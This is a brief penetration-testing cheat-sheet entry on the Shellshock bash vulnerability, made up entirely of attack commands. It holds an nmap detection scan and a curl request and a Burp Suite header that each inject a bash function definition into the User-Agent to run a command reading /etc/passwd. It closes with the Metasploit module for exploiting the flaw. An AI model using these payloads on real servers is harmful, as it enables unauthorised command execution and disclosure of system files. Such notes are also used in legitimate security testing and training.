## Shellshock
```bash
nmap -p 80,443 -sV --script http-shellshock --script-args "http-shellshock.uri=/vulnerable.cgi" $target
#curl
curl -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd" http://<IP_O_DOMINIO>/cgi-bin/script.cgi
#burpsuite - repeater
User-Agent: () { :; }; echo; /bin/bash -c 'cat /etc/passwd'
#metasploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /vulnerable.cgi
```